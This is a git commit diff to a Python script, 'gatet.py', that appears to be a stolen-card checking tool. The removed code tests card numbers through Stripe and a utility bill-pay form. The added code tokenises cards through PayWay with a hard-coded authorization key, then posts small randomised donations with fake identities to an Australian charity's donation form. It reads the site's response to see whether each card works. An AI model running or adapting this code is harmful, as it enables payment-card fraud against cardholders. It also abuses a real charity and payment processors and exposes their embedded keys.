41f73fa80d829b872987ca8f8fc26119da1c58f4
Rodamuser08 <rodamuser08@gmail.com>
2025-06-25 15:52:16 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -17,71 +17,48 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 	
-	url = "https://api.stripe.com/v1/payment_methods"
+	url = "https://billygraham.org.au/wp-json/gf/v2/forms/2/submissions"
 	
 	payload = {
-	  'type': "card",
-	  'card[number]': n,
-	  'card[cvc]': cvc,
-	  'card[exp_month]': mm,
-	  'card[exp_year]': yy,
-	  'guid': "NA",
-	  'muid': "NA",
-	  'sid': "NA",
-	  'payment_user_agent': "stripe.js/20e04cd437; stripe-js-v3/20e04cd437; card-element",
-	  'key': "pk_live_51E63ENKGow8M1pwUr2OFDm4QI539BrmiUdavhuaBuT0A6DDsl0GtTphGVibOS8StRzRc66Fsnsju1Wd3B0slYAOj00y0U6wujC",
+	  'input_5': "$ 0.00",
+	  'input_1.3': "",
+	  'input_1.6': "",
+	  'input_9.1': "",
+	  'input_9.2': "",
+	  'input_9.3': "",
+	  'input_9.4': "",
+	  'input_9.5': "",
+	  'input_9.6': "Australia",
+	  'gpaa_place_9': "",
+	  'input_2': "",
+	  'input_2_2': "",
+	  'input_18': "",
+	  'input_13': "",
+	  'input_11.1': "",
+	  'input_11.2': "",
+	  'input_12.2': "I have read and agree to the <a target=\"_blank\" href=\"https://billygraham.org.au/terms-conditions-privacy-policy/\">website terms and conditions*</a>",
+	  'input_12.3': "1",
+	  'input_17': "",
+	  'input_22': "",
+	  'gform_submission_method': "postback",
+	  'gform_theme': "orbital",
+	  'gform_style_settings': "{\"theme\":\"orbital\",\"inputPrimaryColor\":\"#204ce5\"}",
+	  'is_submit_2': "1",
+	  'gform_submit': "2",
+	  'gform_unique_id': "",
+	  'state_2': "WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcIjU5ZTdkNjYyMDgzYTJhZWYwOTllOTZjYmJlZWJhMzk5XCJ9IiwiMzVhN2ZiNDYwZGFhYTI1NGMzZDc3NDYyNDljODA4YjMiXQ==",
+	  'gform_target_page_number_2': "0",
+	  'gform_source_page_number_2': "1",
+	  'gform_field_values': "",
+	  'gform_save': "true"
 	}
 	
 	headers = {
 	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "application/json",
-	  'authority': "api.stripe.com",
+	  'authority': "billygraham.org.au",
 	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'origin': "https://js.stripe.com",
-	  'referer': "https://js.stripe.com/",
-	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'sec-ch-ua-platform': "\"Android\"",
-	  'sec-fetch-dest': "empty",
-	  'sec-fetch-mode': "cors",
-	  'sec-fetch-site': "same-site"
-	}
-	
-	response = session.post(url, data=payload, headers=headers)
-	
-	pm = response.json()['id']
-	
-	url = "https://mercurywv.com/wp-admin/admin-ajax.php"
-	
-	payload = {
-	  'wpforms[fields][0][first]': 'Rodam',
-	  'wpforms[fields][0][last]': 'User',
-	  'wpforms[fields][1]': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
-	  'wpforms[fields][5]': '1',
-	  'wpforms[fields][2]': '1.00',
-	  'wpforms[fields][3]': '',
-	  'wpforms[stripe-credit-card-cardname]': 'Dao Khao Saard',
-	  'wpforms[hp]': '',
-	  'wpforms[id]': '4178',
-	  'page_title': 'Pay My Bill',
-	  'page_url': 'https://mercurywv.com/pay-bill/',
-	  'url_referer': '',
-	  'page_id': '105',
-	  'wpforms[post_id]': '105',
-	  'wpforms[payment_method_id]': pm,
-	  'wpforms[token]': 'aba2ee731f2c7937f0fdb2e62fe190d8',
-	  'action': 'wpforms_submit',
-	  'start_timestamp': '1750781345',
-	  'end_timestamp': '1750781360'
-	}
-	
-	headers = {
-	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "application/json, text/javascript, */*; q=0.01",
-	  'authority': "mercurywv.com",
-	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'origin': "https://mercurywv.com",
-	  'referer': "https://mercurywv.com/pay-bill/",
+	  'origin': "https://billygraham.org.au",
+	  'referer': "https://billygraham.org.au/donate/your-gift-to-where-most-needed/",
 	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
 	  'sec-ch-ua-mobile': "?1",
 	  'sec-ch-ua-platform': "\"Android\"",
@@ -93,6 +70,106 @@ def Tele(ccx):
 	
 	response = session.post(url, data=payload, headers=headers)
 	
-	result = re.search(r'<p>(.*?)<\\/p>', response.text).group(1)
+	resume_token = re.search(r'"resume_token":"(.*?)"', response.text).group(1)
+	
+	url = "https://api.payway.com.au/rest/v1/single-use-tokens"
+	
+	payload = {
+	  'paymentMethod': "creditCard",
+	  'connectionType': "FRAME",
+	  'cardNumber': n,
+	  'cvn': cvc,
+	  'cardholderName': "Dao Khao Saard",
+	  'expiryDateMonth': mm,
+	  'expiryDateYear': yy,
+	  'threeDS2': "false"
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json",
+	  'authority': "api.payway.com.au",
+	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+	  'authorization': "Basic UTEwNzM1X1BVQl9xdzdqc2dqdzlxZXM0dGdzN255N3RpencycGtxdWJzc2pmbmlyZjZpYzI1cjZrZXhmOWJkbTJxa2Z2YnY6",
+	  'origin': "https://api.payway.com.au",
+	  'referer': "https://api.payway.com.au/rest/v1/creditCard-iframe.htm",
+	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'sec-fetch-dest': "empty",
+	  'sec-fetch-mode': "cors",
+	  'sec-fetch-site': "same-origin",
+	  'x-no-authenticate-basic': "true",
+	  'x-requested-with': "XMLHttpRequest"
+	}
+	
+	response = session.post(url, data=payload, headers=headers)
+	
+	token = response.json()['singleUseTokenId']
+	
+	url = "https://billygraham.org.au/donate/your-gift-to-where-most-needed/"
+	
+	payload = {
+	  'input_3': 'Other amount|0',
+	  'input_4': f'$ {random_amount1}.{random_amount2}',
+	  'input_5': f'$ {random_amount1}.{random_amount2}',
+	  'input_1.3': 'Rodam',
+	  'input_1.6': 'User',
+	  'input_9.1': 'Street 27',
+	  'input_9.2': '',
+	  'input_9.3': 'New York',
+	  'input_9.4': 'New York',
+	  'input_9.5': '10080',
+	  'input_9.6': 'United States',
+	  'gpaa_place_9': '',
+	  'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	  'input_2_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	  'input_18': '',
+	  'input_13': '',
+	  'input_11.1': '',
+	  'input_11.2': token,
+	  'input_12.1': '1',
+	  'input_12.2': 'I have read and agree to the <a target="_blank" href="https://billygraham.org.au/terms-conditions-privacy-policy/">website terms and conditions*</a>',
+	  'input_12.3': '1',
+	  'input_17': '',
+	  'input_22': '',
+	  'gform_submission_method': 'postback',
+	  'gform_theme': 'orbital',
+	  'gform_style_settings': '{"theme":"orbital","inputPrimaryColor":"#204ce5"}',
+	  'is_submit_2': '1',
+	  'gform_submit': '2',
+	  'gform_unique_id': '',
+	  'state_2': 'WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcIjU5ZTdkNjYyMDgzYTJhZWYwOTllOTZjYmJlZWJhMzk5XCJ9IiwiMzVhN2ZiNDYwZGFhYTI1NGMzZDc3NDYyNDljODA4YjMiXQ==',
+	  'gform_target_page_number_2': '0',
+	  'gform_source_page_number_2': '1',
+	  'gform_field_values': '',
+	  'resume_token': resume_token,
+	  'version_hash': 'c06e4e53ddd3d70df325d5d991ac585b'
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
+	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+	  'authority': "billygraham.org.au",
+	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+	  'cache-control': "max-age=0",
+	  'origin': "https://billygraham.org.au",
+	  'referer': "https://billygraham.org.au/donate/your-gift-to-where-most-needed/",
+	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'sec-fetch-dest': "document",
+	  'sec-fetch-mode': "navigate",
+	  'sec-fetch-site': "same-origin",
+	  'sec-fetch-user': "?1",
+	  'upgrade-insecure-requests': "1"
+	}
+	
+	response = session.post(url, data=payload, headers=headers)
+	
+	try:
+		result = re.search(r'#8211; (.*?)<\/div>', response.text).group(1)
+	except:
+		result = re.search(r'<h4>(.*?)<\/h4>', response.text).group(1)
 		
 	return (result)
